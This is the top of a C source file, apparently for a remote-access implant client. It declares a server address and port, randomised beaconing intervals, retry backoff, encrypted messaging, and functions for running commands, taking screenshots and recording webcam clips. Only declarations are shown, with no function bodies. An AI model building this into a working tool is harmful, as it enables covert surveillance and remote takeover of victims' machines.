#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sys/utsname.h>
#include <pthread.h>

#define SALT_SIZE 32
#define IV_SIZE 12
#define KEY_SIZE 32
#define TAG_SIZE 16
#define CHUNK_SIZE 1024

// Globals
int client_socket = -1;
time_t start_time;
int exit_process = 0;
char* SESSION_ID = NULL;
const int LOGGING = 1;
const char* CVER = "0.2.0";
const char* TYPE = "c";
const char* SERVER_ADDRESS = "localhost";
const int SERVER_PORT = 54678;
const int MAX_RETRIES = 5;
const int RETRY_INTERVALS[] = {
    10000,   // 10 seconds
    30000,   // 30 seconds
    60000,   // 1 minute
    120000,  // 2 minutes
    240000,  // 4 minutes
    360000   // 6 minutes
};
const int BEACON_MIN_INTERVAL = 300000; // 5 minutes
const int BEACON_MAX_INTERVAL = 2700000; // 45 minutes

FILE* log_file = NULL;

// Function prototypes
void log_it(const char* message);
char* get_session_id(const char* ip_address);
char* encrypt_data(const char* data, const char* shared_key);
char* decrypt_data(const char* encrypted, const char* shared_key);
void send_command(const char* response);
void send_beacon();
void sleep_ms(int milliseconds);
char* format_file_name(const char* name, const char* extension);
char* format_time(long milliseconds);
void get_uptime();
char* run_command(const char* command);
void parse_action(const char* action);
int get_retry_interval(int retries);
unsigned short* utf8_to_utf16(const char* str);
void* beacon_interval_thread(void* arg);
void start_beacon_interval();
void run_screenshot();
void run_webcam_clip();
int connect_to_server();
void handle_connection();